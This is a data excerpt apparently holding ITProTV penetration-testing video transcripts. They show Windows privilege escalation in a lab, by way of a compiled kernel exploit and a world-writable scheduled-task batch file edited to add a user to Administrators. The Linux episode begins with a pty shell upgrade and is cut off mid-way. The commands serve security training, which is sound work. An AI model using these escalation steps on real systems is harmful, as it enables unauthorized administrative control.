statements.\n\n341\n00:16:25.770 --> 00:16:27.870\nDown in here, where is it?\n\n342\n00:16:27.870 --> 00:16:31.300\nRight here, this typedef long.\n\n343\n00:16:31.300 --> 00:16:34.860\nThis looked like this originally.\n\n344\n00:16:36.590 --> 00:16:38.140\nThat's what that looked like.\n\n345\n00:16:38.140 --> 00:16:40.025\nSo they set this as a DWORD.\n\n346\n00:16:41.740 --> 00:16:43.728\nThat did not work.\n\n347\n00:16:43.728 --> 00:16:45.330\nAnd I got compilation errors.\n\n348\n00:16:45.330 --> 00:16:51.010\nSo if I save this, Ctrl+O, and\nCtrl+X, save it out of there.\n\n349\n00:16:51.010 --> 00:16:52.270\nWe try to do the exact same thing.\n\n350\n00:16:52.270 --> 00:16:52.890\nI'll call it Net3.\n\n351\n00:16:52.890 --> 00:16:57.520\nLook at that, compilation errors.\n\n352\n00:16:57.520 --> 00:16:59.620\nThere you go, DWORD, NTSTATUS.\n\n353\n00:16:59.620 --> 00:17:00.960\nIt was freaking out.\n\n354\n00:17:00.960 --> 00:17:02.860\nAnd we're like, why is this happening?\n\n355\n00:17:02.860 --> 00:17:04.470\nWe were Google searching things.\n\n356\n00:17:04.470 --> 00:17:05.310\nAnd through Google searching,\n\n357\n00:17:05.310 --> 00:17:10.040\nwe found that it should have been\nan operational long and not DWORD.\n\n358\n00:17:10.040 --> 00:17:14.608\nSomebody just randomly passe said\nsomething about operational long.\n\n359\n00:17:14.608 --> 00:17:18.115\nAnd Justin was like, try changing\nthis to long instead of DWORD.\n\n360\n00:17:18.115 --> 00:17:20.700\nAnd boom, compilation.\n\n361\n00:17:20.700 --> 00:17:21.780\nSo that's great.\n\n362\n00:17:21.780 --> 00:17:22.863\nIt was great it compiled.\n\n363\n00:17:22.863 --> 00:17:24.923\nBut that doesn't mean\nwe had full execution.\n\n364\n00:17:24.923 --> 00:17:26.750\nSo you had to do that.\n\n365\n00:17:26.750 --> 00:17:31.640\nSo now that we have our compiled code,\ncuz I did that before I changed it.\n\n366\n00:17:31.640 --> 00:17:32.942\n&gt;&gt; Yeah.\n&gt;&gt; I have to go back and do it again.\n\n367\n00:17:32.942 --> 00:17:37.250\nWith Net2 or Net whatever,\nwe can do either.\n\n368\n00:17:37.250 --> 00:17:38.260\nYou need to copy that over.\n\n369\n00:17:38.260 --> 00:17:40.880\nI wanna just fire up my handy HTTP server.\n\n370\n00:17:40.880 --> 00:17:41.870\nFound out what the problem was.\n\n371\n00:17:41.870 --> 00:17:44.120\nIf you watched the previous show,\nwe had issues with that.\n\n372\n00:17:44.120 --> 00:17:45.770\nIt wasn't my server.\n\n373\n00:17:45.770 --> 00:17:48.300\nIt was the browser did not like it.\n\n374\n00:17:48.300 --> 00:17:50.350\nSo this browser works fine with it.\n\n375\n00:17:50.350 --> 00:17:53.962\nSo I will fire it up,\n\n376\n00:17:53.962 --> 00:17:59.700\npython -m SimpleHTTPServer,\n\n377\n00:17:59.700 --> 00:18:04.381\nI'll put it on 8080.\n\n378\n00:18:04.381 --> 00:18:04.931\nThere we go.\n\n379\n00:18:04.931 --> 00:18:06.350\nNow I'm listening on port 8080.\n\n380\n00:18:06.350 --> 00:18:13.490\nI can open up my remote desktop,\nfire up the browser, and hit OK here.\n\n381\n00:18:14.540 --> 00:18:23.562\nAnd just say,\n192.168.209.146 port 8080/net.exe.\n\n382\n00:18:23.562 --> 00:18:25.478\nThere we go, it says, couldn't find it.\n\n383\n00:18:25.478 --> 00:18:27.196\nMake sure I typed everything correctly.\n\n384\n00:18:27.196 --> 00:18:27.902\n&gt;&gt; Is that 8080?\n\n385\n00:18:27.902 --> 00:18:30.850\n&gt;&gt; [INAUDIBLE] Net.exe, did I move?\n\n386\n00:18:33.840 --> 00:18:35.350\nNo, everything's there.\n\n387\n00:18:35.350 --> 00:18:39.180\nI literally did this right before\nwe started the show, so it's funny.\n\n388\n00:18:39.180 --> 00:18:40.270\nPage cannot be displayed.\n\n389\n00:18:40.270 --> 00:18:42.075\nWell, let's do this just to make sure.\n\n390\n00:18:43.375 --> 00:18:44.725\nOkay, yeah, it's working now.\n\n391\n00:18:44.725 --> 00:18:46.220\nSo yeah, of course.\n\n392\n00:18:46.220 --> 00:18:48.375\n&gt;&gt; [LAUGH]\n&gt;&gt; Jump to my computer.\n\n393\n00:18:48.375 --> 00:18:51.693\nRight here, I put http://.\n\n394\n00:18:51.693 --> 00:18:55.195\nThe ping seemed to like that a whole\nlot better cuz there's the file.\n\n395\n00:18:55.195 --> 00:18:55.975\nLet's save that.\n\n396\n00:18:57.005 --> 00:18:58.045\nI'll just save it to my desktop.\n\n397\n00:18:59.300 --> 00:19:01.920\nAnd there we go, I can hit Close.\n\n398\n00:19:01.920 --> 00:19:03.890\nAnd now I have that guy.\n\n399\n00:19:03.890 --> 00:19:07.011\nAnd you'll notice I'm just User1.\n\n400\n00:19:07.011 --> 00:19:09.943\nIf I go to My Computer, hit Manage.\n\n401\n00:19:11.896 --> 00:19:14.505\nThere's Groups,\nthere's Administrators right there.\n\n402\n00:19:14.505 --> 00:19:18.063\nUser1 is not in there, Cancel.\n\n403\n00:19:18.063 --> 00:19:20.700\nSo I have no administrative privileges.\n\n404\n00:19:20.700 --> 00:19:26.659\nSo now if I open up a command prompt and\nI cd into the desktop.\n\n405\n00:19:29.120 --> 00:19:30.752\nMove this over just a bit.\n\n406\n00:19:30.752 --> 00:19:32.583\nCan you guys see that very well?\n\n407\n00:19:32.583 --> 00:19:33.169\n&gt;&gt; Bump it up just a hair a little bit.\n\n408\n00:19:33.169 --> 00:19:36.530\n&gt;&gt; Yeah, let me just scroll in here.\n\n409\n00:19:37.840 --> 00:19:38.550\nHow's that look, Mike?\n\n410\n00:19:38.550 --> 00:19:39.190\n&gt;&gt; Much better.\n\n411\n00:19:39.190 --> 00:19:44.006\n&gt;&gt; All right, and\nnow I should be able to type in Net.exe.\n\n412\n00:19:44.006 --> 00:19:45.660\nActually, first, let's try whoami.\n\n413\n00:19:46.880 --> 00:19:48.567\nThere it is, user1.\n\n414\n00:19:48.567 --> 00:19:54.807\nAnd now /Net,\nI'm doing Linux [LAUGH] Net.exe.\n\n415\n00:19:54.807 --> 00:19:59.559\nAnd now you'll notice that my\nprompt has changed to system32.\n\n416\n00:19:59.559 --> 00:20:03.930\nWhoami, NT authority system.\n\n417\n00:20:03.930 --> 00:20:05.634\nSo I've elevated my privileges.\n\n418\n00:20:05.634 --> 00:20:08.790\nNow I can do things like,\nsay, I don't know.\n\n419\n00:20:08.790 --> 00:20:10.251\nLet's see here.\n\n420\n00:20:10.251 --> 00:20:16.114\nNet localgroup administrators,\n\n421\n00:20:16.114 --> 00:20:21.174\nand we'll say user1 /add.\n\n422\n00:20:23.840 --> 00:20:25.250\nNow, he's a part of\nthe administrators group.\n\n423\n00:20:25.250 --> 00:20:28.040\nSo let me scroll out just a hair.\n\n424\n00:20:29.250 --> 00:20:35.250\nIf I go back into My Computer, hit Manage.\n\n425\n00:20:35.250 --> 00:20:40.517\nLook at the Local Users and\nGroups &gt; Administrators, there's user1.\n\n426\n00:20:40.517 --> 00:20:41.725\nSo we successfully added him.\n\n427\n00:20:41.725 --> 00:20:43.520\nWe've escalated our privileges.\n\n428\n00:20:43.520 --> 00:20:45.230\nAnd now we can do whatever we want.\n\n429\n00:20:46.330 --> 00:20:47.490\nYes, that's a lot of work.\n\n430\n00:20:47.490 --> 00:20:49.420\nBut we've reached the mountain top.\n\n431\n00:20:49.420 --> 00:20:50.560\n&gt;&gt; We have, absolutely.\n\n432\n00:20:50.560 --> 00:20:54.260\nI mean, at this point, you can pretty much\ndo whatever you want with that system.\n\n433\n00:20:54.260 --> 00:20:57.150\n&gt;&gt; Yeah, it's ours to own and\nplay with as we like.\n\n434\n00:20:57.150 --> 00:20:59.154\nAll right, let me start closing\nall this stuff down here.\n\n435\n00:20:59.154 --> 00:21:02.110\nLet me cancel this and close that.\n\n436\n00:21:02.110 --> 00:21:03.980\nAnd very simple,\nall I have to do is have that exploit.\n\n437\n00:21:03.980 --> 00:21:06.789\nSo any time I want administrative\nprivileges, even if\n\n438\n00:21:06.789 --> 00:21:10.403\nthey remove me from an administors,\nI could just rerun that exploit.\n\n439\n00:21:10.403 --> 00:21:13.728\n&gt;&gt; Yeah, cuz you might have\na restrictive Group Policy on a domain\n\n440\n00:21:13.728 --> 00:21:15.556\nbased Windows operating system.\n\n441\n00:21:15.556 --> 00:21:17.160\nThey might be doing Restricted Groups.\n\n442\n00:21:17.160 --> 00:21:20.230\nBut remember, Restricted Groups\ndon't prevent you from adding.\n\n443\n00:21:20.230 --> 00:21:23.597\nIt's just going to check\nthat membership list.\n\n444\n00:21:23.597 --> 00:21:26.110\nAnd make sure it's accurate every\ntime Group Policy refreshes.\n\n445\n00:21:26.110 --> 00:21:27.687\nSo you can slip yourself in.\n\n446\n00:21:27.687 --> 00:21:28.524\nDo what you need to do.\n\n447\n00:21:28.524 --> 00:21:30.190\nGet out, and you're good to go.\n\n448\n00:21:30.190 --> 00:21:32.694\n&gt;&gt; So Mike, yeah, a really cool exploit.\n\n449\n00:21:32.694 --> 00:21:33.600\nThat was awesome to watch.\n\n450\n00:21:33.600 --> 00:21:35.910\nWe get to jump our privileges there.\n\n451\n00:21:35.910 --> 00:21:38.492\nAnd technically,\nit is a type of local exploit.\n\n452\n00:21:38.492 --> 00:21:43.520\nCuz we downloaded it, I guess,\ninto the machine and ran it locally.\n\n453\n00:21:43.520 --> 00:21:44.970\nCuz I had that RDP session.\n\n454\n00:21:44.970 --> 00:21:48.910\nBut there's another way which you\ncan do local privilege escalation.\n\n455\n00:21:48.910 --> 00:21:53.860\nThat would have run as well if\nI had done a shell exploit.\n\n456\n00:21:53.860 --> 00:21:56.513\nAnd I had that shell,\nI could still load the file.\n\n457\n00:21:56.513 --> 00:21:58.890\nTechnically, it's still local,\nbut you're remoted into the box.\n\n458\n00:21:58.890 --> 00:22:02.660\nSo, I guess, however, and six on one,\nhalf a dozen of the other.\n\n459\n00:22:02.660 --> 00:22:05.340\n&gt;&gt; So this one like the one we're getting\nready to do might be more like if I had\n\n460\n00:22:05.340 --> 00:22:06.600\nphysical access to a machine.\n\n461\n00:22:06.600 --> 00:22:10.729\n&gt;&gt; Right, or again with the RDP, something\nwhere you can take a look at the files.\n\n462\n00:22:12.830 --> 00:22:14.194\nAgain, six on one, half a dozen.\n\n463\n00:22:14.194 --> 00:22:16.270\nIt just depends on how\nyou're looking at it.\n\n464\n00:22:16.270 --> 00:22:21.810\nLocal or remote file exploitation,\njust a matter of perspective apparently.\n\n465\n00:22:21.810 --> 00:22:25.313\nThat being said,\nlet's jump into my Windows 7 machine.\n\n466\n00:22:25.313 --> 00:22:31.449\nI'm logged as, again, a local user,\nuser1, has no file permissions.\n\n467\n00:22:31.449 --> 00:22:36.600\nLet's go over here and\nget into My Computer, hit Manage.\n\n468\n00:22:36.600 --> 00:22:38.780\nAnd look, so\nyou can't even manage the thing.\n\n469\n00:22:38.780 --> 00:22:40.320\nCuz I'm not an administrator.\n\n470\n00:22:40.320 --> 00:22:42.270\nSo that proves that fact.\n\n471\n00:22:42.270 --> 00:22:44.286\nDid some poking around looking for stuff.\n\n472\n00:22:44.286 --> 00:22:46.445\nYou gotta remember, administrators,\nas great as they are,\n\n473\n00:22:46.445 --> 00:22:48.020\ndon't always do things correctly.\n\n474\n00:22:48.020 --> 00:22:53.530\nSometimes, they set wrong permissions on\nthings that could be used as exploits.\n\n475\n00:22:53.530 --> 00:22:55.898\nThings that run as themselves.\n\n476\n00:22:55.898 --> 00:22:59.040\nBut you have permission\nto maybe modify them.\n\n477\n00:22:59.040 --> 00:23:01.430\nBatch scripts, any kind of scripts\nthat they may have created.\n\n478\n00:23:01.430 --> 00:23:05.200\nIf they set the incorrect permissions\non it, can give everybody access.\n\n479\n00:23:05.200 --> 00:23:08.726\nBut it runs as the administrator\nthrough the scheduled task.\n\n480\n00:23:08.726 --> 00:23:13.456\nThen if you modify that, well, then you'll\nbe able to run that, whatever it is,\n\n481\n00:23:13.456 --> 00:23:16.840\nas the administrator instead\nof your local permissions.\n\n482\n00:23:16.840 --> 00:23:19.430\n&gt;&gt; I can attest to the fact,\nI've done that myself before.\n\n483\n00:23:19.430 --> 00:23:23.430\nIf you're launching some program and it's\ngot a service account that you create.\n\n484\n00:23:23.430 --> 00:23:25.770\nYou create it as a standard user and\nthe program won't run.\n\n485\n00:23:25.770 --> 00:23:30.170\nNow you gotta figure out, what does that\naccount need for this program to run?\n\n486\n00:23:30.170 --> 00:23:32.037\nAnd sometimes,\nit's such a pain that you're like,\n\n487\n00:23:32.037 --> 00:23:33.580\nI'll just give it administrative access.\n\n488\n00:23:33.580 --> 00:23:34.850\nIt's a service account.\n\n489\n00:23:34.850 --> 00:23:37.207\nAnd yes, now the program runs.\n\n490\n00:23:37.207 --> 00:23:39.455\nBut that service account,\nif ever compromised,\n\n491\n00:23:39.455 --> 00:23:41.280\nis an administrator on a local machine.\n\n492\n00:23:41.280 --> 00:23:42.540\n&gt;&gt; That's the problem.\n\n493\n00:23:42.540 --> 00:23:45.240\nWe as administrators,\nwe don't do everything perfectly.\n\n494\n00:23:45.240 --> 00:23:48.564\nAnd we're looking for those imperfections\nso that we can exploit them.\n\n495\n00:23:48.564 --> 00:23:51.021\nSo, as I said, I was kicking around and\n\n496\n00:23:51.021 --> 00:23:54.232\nI went into the Computer\nhere under File Explorer.\n\n497\n00:23:54.232 --> 00:24:00.250\nAnd say, Computer,\nI was digging through the user profiles.\n\n498\n00:24:00.250 --> 00:24:02.089\nAnd I found, of course\nthe default one's the hidden one.\n\n499\n00:24:02.089 --> 00:24:04.323\nI had to make that be able to be shown.\n\n500\n00:24:04.323 --> 00:24:07.598\nAnd if I looked in the Desktop,\nI found this showme.bat.\n\n501\n00:24:07.598 --> 00:24:10.980\nAnd if I double-clicked it,\nit runs, that's cool.\n\n502\n00:24:10.980 --> 00:24:12.680\nIf I edit it, it's just a whoami.\n\n503\n00:24:12.680 --> 00:24:14.680\nSo just a script basically, right?\n\n504\n00:24:14.680 --> 00:24:17.950\nA batch file that is running something.\n\n505\n00:24:17.950 --> 00:24:23.632\nBut I also realized that it was\nrunning every so often, right?\n\n506\n00:24:23.632 --> 00:24:25.930\nSo that was the bad part about it.\n\n507\n00:24:25.930 --> 00:24:27.190\nThat it was running every so often.\n\n508\n00:24:27.190 --> 00:24:30.940\nAnd I have, if I go to the Properties and\n\n509\n00:24:32.150 --> 00:24:35.190\nlook at Security,\neveryone has full control.\n\n510\n00:24:36.290 --> 00:24:37.530\nThat's bad.\n\n511\n00:24:37.530 --> 00:24:41.270\nThat's bad because this thing is running\n\n512\n00:24:41.270 --> 00:24:44.650\nin a scheduled task that\nthe administrator set up, okay?\n\n513\n00:24:44.650 --> 00:24:47.860\nSo what I can do, is I can go in here,\nand edit, and say,\n\n514\n00:24:47.860 --> 00:24:50.060\nyou know what, let's edit this.\n\n515\n00:24:50.060 --> 00:24:54.783\nLet's say, net user or local groups,\nthat's why I'll do, group,\n\n516\n00:24:54.783 --> 00:24:58.320\nadministrators, right,\nit's administrators?\n\n517\n00:24:58.320 --> 00:25:00.994\nYeah, it's administrators.\n\n518\n00:25:00.994 --> 00:25:07.050\nUser1/add, and then I will Save that.\n\n519\n00:25:07.050 --> 00:25:09.706\nFile &gt; Save,\nwhich it gave me no problem about.\n\n520\n00:25:09.706 --> 00:25:11.846\nAnd we're good.\n\n521\n00:25:11.846 --> 00:25:15.820\nNow, since this is running as\na scheduled task, every so\n\n522\n00:25:15.820 --> 00:25:18.570\noften that task will fire off and\nrun that script.\n\n523\n00:25:18.570 --> 00:25:23.970\nThis could be, look through files, and\nmaybe make a backup of a directory.\n\n524\n00:25:23.970 --> 00:25:27.190\nIt could be anything that the\nadministrator set up to run as themselves.\n\n525\n00:25:27.190 --> 00:25:28.710\nBut if, you know what,\n\n526\n00:25:28.710 --> 00:25:32.770\nMike needs to add his files to that,\nI'll just give him permissions.\n\n527\n00:25:32.770 --> 00:25:36.064\nAnd it's easy, like you said, I'll just\nadd everyone, no one knows about it.\n\n528\n00:25:36.064 --> 00:25:37.000\n&gt;&gt; [LAUGH] Yep.\n\n529\n00:25:37.000 --> 00:25:39.830\n&gt;&gt; Little do they know, people like us\nare out there looking for these things.\n\n530\n00:25:39.830 --> 00:25:44.950\nAll right, so I'm gonna log in as\nthe administrator so I can show you.\n\n531\n00:25:44.950 --> 00:25:47.647\nLet me log off.\n\n532\n00:25:47.647 --> 00:25:51.750\n[COUGH] So you can see when that's\ngonna happen and watch that happen.\n\n533\n00:25:52.980 --> 00:25:56.111\nLog in.\n\n534\n00:25:56.111 --> 00:25:58.020\nHopefully I typed that correctly,\nlooks like I did.\n\n535\n00:26:00.470 --> 00:26:06.520\nAnd if I go to Task Scheduler,\nand look in scheduled tasks.\n\n536\n00:26:07.920 --> 00:26:13.330\nThere's my task,\nit says the next run time will be at 3:50.\n\n537\n00:26:13.330 --> 00:26:16.925\nOoh, it should be running any time now.\n\n538\n00:26:16.925 --> 00:26:20.094\nLet's see here, yeah,\nit probably just fired off.\n\n539\n00:26:20.094 --> 00:26:26.971\nAnd if we refresh this, We'll see,\nyep, and now, let's jump over to,\n\n540\n00:26:26.971 --> 00:26:30.880\nnow, you'll notice I didn't do\nanything in local users or groups.\n\n541\n00:26:30.880 --> 00:26:32.210\nNothing has happened.\n\n542\n00:26:32.210 --> 00:26:35.090\nMy User1 did modify that batch file.\n\n543\n00:26:36.870 --> 00:26:38.660\nIf we go to Computer and hit Manage.\n\n544\n00:26:40.190 --> 00:26:44.421\nAnd we hit Local Users and Groups,\nthere's the group administrators.\n\n545\n00:26:44.421 --> 00:26:46.290\nLook who's sitting pretty.\n\n546\n00:26:46.290 --> 00:26:50.205\n&gt;&gt; Dum dum dum.\n&gt;&gt; User1, there she blows right there.\n\n547\n00:26:50.205 --> 00:26:52.810\nUser1 is now a full blown administrator.\n\n548\n00:26:52.810 --> 00:26:56.180\nThat user just had to sit there and\ntwiddle their thumbs and wait for\n\n549\n00:26:56.180 --> 00:26:57.890\nthat scheduled task to run.\n\n550\n00:26:57.890 --> 00:26:59.950\nOnce it did, well, there they are.\n\n551\n00:26:59.950 --> 00:27:03.107\nAnd they were able because of\nincorrectly set permissions and\n\n552\n00:27:03.107 --> 00:27:05.788\nat the fact that it was\nrunning as an administrator.\n\n553\n00:27:05.788 --> 00:27:10.082\nGave it those administrator privileges for\njust the moment it needed, so\n\n554\n00:27:10.082 --> 00:27:12.670\nthat it could add them\nto the right account.\n\n555\n00:27:12.670 --> 00:27:14.380\n&gt;&gt; All right Daniel,\nimpressive stuff there.\n\n556\n00:27:14.380 --> 00:27:18.150\nWe got to see a couple of different\nways we could go about escalating our\n\n557\n00:27:18.150 --> 00:27:20.900\ncredentials or\nprivileges within a Windows system.\n\n558\n00:27:20.900 --> 00:27:23.920\nSo we appreciate that,\nfantastic demonstrations.\n\n559\n00:27:23.920 --> 00:27:26.210\nHope everybody out there\nenjoyed watching this one.\n\n560\n00:27:26.210 --> 00:27:28.980\nSigning off for ITProTV,\nI've been your host Mike Rodrick.\n\n561\n00:27:28.980 --> 00:27:29.870\n&gt;&gt; And I'm Daniel Lowrie.\n\n562\n00:27:29.870 --> 00:27:32.117\n&gt;&gt; And we'll see you next time.\n\n563\n00:27:32.117 --> 00:27:38.020\n[MUSIC]\n\n564\n00:27:38.020 --> 00:27:41.422\n&gt;&gt; Thank you for watching ITProTV.\n\n",
          "vimeoId": "202939472"
        },
        {
          "description": "In this episode, Dan and Mike demonstrate how to escalate privileges in a Linux environment. They discuss different methods that might be used for privilege escalation. Then they demonstrate performing a lateral escalation, followed by an escalation to root.",
          "length": "1462",
          "thumbnail": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-2-linux_privilege_escalation-020217-PGM.00_24_08_15.Still001.png",
          "thumbnailMed": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-2-linux_privilege_escalation-020217-PGM.00_24_08_15.Still001-med.jpg",
          "thumbnailSm": "https://itprotv-image-bucket.s3.amazonaws.com/techskills-pentest/techskills-pentest-7-2-linux_privilege_escalation-020217-PGM.00_24_08_15.Still001-sm.jpg",
          "title": "Linux Privilege Escalation",
          "transcript": "WEBVTT\n\n1\n00:00:00.250 --> 00:00:01.190\nWelcome to ITProTV.\n\n2\n00:00:01.190 --> 00:00:02.730\nI'm your host, Don Pezet.\n\n3\n00:00:02.730 --> 00:00:07.320\n&gt;&gt; Talking to you live from San Francisco-\n&gt;&gt; Photoshop.\n\n4\n00:00:07.320 --> 00:00:12.590\n&gt;&gt; You're watching ITProTV.\n\n5\n00:00:12.590 --> 00:00:15.530\n&gt;&gt; Hello, welcome to another\nexciting episode here at ITProTV.\n\n6\n00:00:15.530 --> 00:00:17.340\nI'm your host, Mike Rodrick.\n\n7\n00:00:17.340 --> 00:00:19.760\nToday we're doing penetration testing.\n\n8\n00:00:19.760 --> 00:00:24.520\nAnd in this episode, we're gonna be taking\na look at Linux Privilege Escalation.\n\n9\n00:00:24.520 --> 00:00:28.290\nWe've already taken a look at what it\ntakes to do that in a Windows environment.\n\n10\n00:00:28.290 --> 00:00:32.040\nNow we're gonna show you what we need\nto do to escalate our credentials or\n\n11\n00:00:32.040 --> 00:00:36.910\nprivileges within Linux and here to\ndemonstrate for us is Mr. Daniel Lowrie.\n\n12\n00:00:36.910 --> 00:00:37.620\nWelcome back Daniel.\n\n13\n00:00:37.620 --> 00:00:38.750\n&gt;&gt; Mike so glad to be back.\n\n14\n00:00:38.750 --> 00:00:40.830\nWe have an action packed episode for\ntoday.\n\n15\n00:00:40.830 --> 00:00:45.400\nIf you watch the Windows Pros escalation,\nyou are probably primed and ready to go.\n\n16\n00:00:45.400 --> 00:00:48.080\nOkay I've worked at Windows,\nI think I can handle that.\n\n17\n00:00:48.080 --> 00:00:51.650\nLinux might not be your forte or maybe\nyou're like yes, finally it's Linux time.\n\n18\n00:00:51.650 --> 00:00:54.370\nI'm gonna totally root that box, right?\n\n19\n00:00:54.370 --> 00:00:57.390\nEither way you should be\nglad to be here I know I am.\n\n20\n00:00:57.390 --> 00:00:59.720\nBecause we have a lot\nof ground to cover and\n\n21\n00:00:59.720 --> 00:01:01.710\na very short amount of time to do that.\n\n22\n00:01:01.710 --> 00:01:03.790\nSo I said we just jump\nright into the fray, so\n\n23\n00:01:03.790 --> 00:01:09.590\nprivileges escalation remember is all\nabout going from a non-route user or\n\n24\n00:01:09.590 --> 00:01:13.290\nnon administrative user and\ngaining more privileges.\n\n25\n00:01:13.290 --> 00:01:17.970\nOr even below that,\njumping up to someone with at least more\n\n26\n00:01:17.970 --> 00:01:22.360\nprivileges than yourself ultimately\nlooking for the Apex of the mountain,\n\n27\n00:01:22.360 --> 00:01:24.760\nwhich is the root core user.\n\n28\n00:01:24.760 --> 00:01:29.320\nSo that's what we're trying to do\njust like in Windows we can find\n\n29\n00:01:29.320 --> 00:01:33.320\nout maybe there's a kernel exploit for\nthe Linux system that you're in and\n\n30\n00:01:33.320 --> 00:01:38.160\ncan go to Exploit-DB or use search plot\nto look for that really easy ways.\n\n31\n00:01:38.160 --> 00:01:40.690\nIf you jump into my machine\nreally quickly, I already have.\n\n32\n00:01:40.690 --> 00:01:42.110\nWe're kinda picking up,\n\n33\n00:01:42.110 --> 00:01:45.550\nsetting the stage, we're picking up where\nwe left off with the pound lab exercise.\n\n34\n00:01:45.550 --> 00:01:49.200\nRemember the good folks at\nvulnhub who let us use these.\n\n35\n00:01:49.200 --> 00:01:51.650\nWe downloaded and are using them for\ndemonstration purposes.\n\n36\n00:01:51.650 --> 00:01:54.820\nSo jump over to vulnhub.com if\nyou have not done so already.\n\n37\n00:01:54.820 --> 00:01:59.555\nFire up homelab, get to the part where\nwe left off where we did an LFI or\n\n38\n00:01:59.555 --> 00:02:03.162\nan RFI, I can never remember,\nit was one of the two.\n\n39\n00:02:03.162 --> 00:02:04.510\nI think it was an LFI.\n\n40\n00:02:04.510 --> 00:02:11.240\nIt was a local file inclusion that we\nused to exploit and gain a root shell or\n\n41\n00:02:11.240 --> 00:02:16.100\nnot a root shell, but we gained a shell to\nthat system, I'm at that point right now.\n\n42\n00:02:16.100 --> 00:02:20.039\nIf I do a who am I,\nyou'll see I'm www-data,\n\n43\n00:02:20.039 --> 00:02:26.030\nwhich is the service account for\ntheir user, right?\n\n44\n00:02:26.030 --> 00:02:29.710\nSo what I wanna do is gain some\ninformation cuz maybe that can be helpful,\n\n45\n00:02:29.710 --> 00:02:35.090\nthings like click and cut,\n/etc/issue like that and\n\n46\n00:02:36.150 --> 00:02:39.640\nthis is a Debian Linux 8.\n\n47\n00:02:39.640 --> 00:02:41.640\nOkay I know it's a Debian system.\n\n48\n00:02:41.640 --> 00:02:46.580\nI can maybe run that through search split\nor db or exploit db, find something.\n\n49\n00:02:46.580 --> 00:02:51.610\nWould be nice to have a little\nmore information to try uname-a.\n\n50\n00:02:51.610 --> 00:02:52.800\nYeah, that's more like it.\n\n51\n00:02:52.800 --> 00:02:54.650\nSo now I'm getting version numbers.\n\n52\n00:02:54.650 --> 00:03:00.310\nLook it's Debian 3.16.7,\nI can attack that vector.\n\n53\n00:03:00.310 --> 00:03:03.250\nI can look for, just like what\nwe did with the Windows system.\n\n54\n00:03:03.250 --> 00:03:06.120\nBut since we already did that,\nwe're gonna move on.\n\n55\n00:03:06.120 --> 00:03:11.360\nWe're gonna kind of pick up where we left\noff with Windows about misconfigured\n\n56\n00:03:11.360 --> 00:03:12.370\ninformation, right?\n\n57\n00:03:12.370 --> 00:03:13.960\nMisconfigured permissions.\n\n58\n00:03:13.960 --> 00:03:15.580\nThat's typically where you're gonna go.\n\n59\n00:03:15.580 --> 00:03:19.050\nNot that you can't totally use\nan exploit and make that happen.\n\n60\n00:03:19.050 --> 00:03:20.400\nYou sure can.\n\n61\n00:03:20.400 --> 00:03:23.630\nBut I just wanna continue, cuz that's\nwhere I wanna reiterate these things.\n\n62\n00:03:23.630 --> 00:03:25.140\nSo let's see here.\n\n63\n00:03:26.350 --> 00:03:27.640\nLet's start the lab.\n\n64\n00:03:27.640 --> 00:03:29.000\nWe did the whoami.\n\n65\n00:03:29.000 --> 00:03:30.256\nWe know that we're running as data.\n\n66\n00:03:30.256 --> 00:03:37.820\nLet's do an ls and wow,\ntotally it must be, let's do a pwd.\n\n67\n00:03:37.820 --> 00:03:39.650\nYeah, I'm at the root directory.\n\n68\n00:03:39.650 --> 00:03:42.930\nSomebody changed the /home, do and ls.\n\n69\n00:03:43.990 --> 00:03:48.730\nYeah, that's right remember we found\nthe list of users in our My SQL Database.\n\n70\n00:03:48.730 --> 00:03:49.930\nRemember that?\n\n71\n00:03:49.930 --> 00:03:54.620\nAwesome, so they all are users on this\nsystem, and that's how we logged in,\n\n72\n00:03:54.620 --> 00:03:59.380\nas I think we logged in as Kent,\nand uploaded our malicious shell.\n\n73\n00:03:59.380 --> 00:04:00.350\nAnd gave us that reverse shell.\n\n74\n00:04:01.420 --> 00:04:03.750\nLet's see if there's anything\ninside of these guys.\n\n75\n00:04:05.590 --> 00:04:08.680\nI'm logged in as kent, maybe I can,\nI'm not logged in as kent.\n\n76\n00:04:08.680 --> 00:04:10.230\nI'm logged in as www-data.\n\n77\n00:04:10.230 --> 00:04:11.286\nLet's try to move to kent.\n\n78\n00:04:13.251 --> 00:04:14.870\nCan't cd to kent.\n\n79\n00:04:14.870 --> 00:04:18.400\nOkay, that means there's permissions\non that, I can't get to it.\n\n80\n00:04:18.400 --> 00:04:20.330\nMaybe if I can su.\n\n81\n00:04:20.330 --> 00:04:21.390\nMust be run from terminal.\n\n82\n00:04:21.390 --> 00:04:25.723\nThis is something that you'll encounter\nfrom time to time, we'll get this error,\n\n83\n00:04:25.723 --> 00:04:27.137\nmust be run from terminal.\n\n84\n00:04:27.137 --> 00:04:31.641\nThere is a good way to get around with\nthis,we use our good friend Python\n\n85\n00:04:31.641 --> 00:04:33.076\nto push this.\n\n86\n00:04:33.076 --> 00:04:37.375\nWhat is happening is this is not seeing\nas you logged in in a normal virtual\n\n87\n00:04:37.375 --> 00:04:40.061\nterminal, this is like\nstrange thing to it.\n\n88\n00:04:40.061 --> 00:04:45.075\nSo we need to on a because\nthis is just shell right,\n\n89\n00:04:45.075 --> 00:04:49.372\nthis is just sh, it's not dash so\nwe wanna elevate that,\n\n90\n00:04:49.372 --> 00:04:53.150\nwanna move to that so\nlet's use Python to do that.\n\n91\n00:04:54.565 --> 00:04:56.680\nYou'll wanna write this down,\nthis will be in the show notes for\n\n92\n00:04:56.680 --> 00:05:00.030\nyou because this is something that\nyou will eventually memorize but\n\n93\n00:05:00.030 --> 00:05:01.640\nif you haven't done it before.\n\n94\n00:05:01.640 --> 00:05:03.810\nAnd I think it's also on pentestmonkey.\n\n95\n00:05:03.810 --> 00:05:05.830\nPentestmonkey, great site, right?\n\n96\n00:05:05.830 --> 00:05:07.390\nGotta love that.\n\n97\n00:05:07.390 --> 00:05:08.740\nSo let's do this.\n\n98\n00:05:08.740 --> 00:05:12.828\nJust do python-c, and\n\n99\n00:05:12.828 --> 00:05:17.966\nthen give the single quote import pty.\n\n100\n00:05:17.966 --> 00:05:20.639\nPty, hello.\n\n101\n00:05:20.639 --> 00:05:27.290\nPty, then a ; then pty.spawn.\n\n102\n00:05:27.290 --> 00:05:30.825\nA-W-N, like that.\n\n103\n00:05:30.825 --> 00:05:35.773\nOpen parentheses then do\n\n104\n00:05:35.773 --> 00:05:40.930\n(\"/bin/bash\").\n\n105\n00:05:40.930 --> 00:05:41.570\nCuz remember,\n\n106\n00:05:41.570 --> 00:05:46.260\nwe started with a 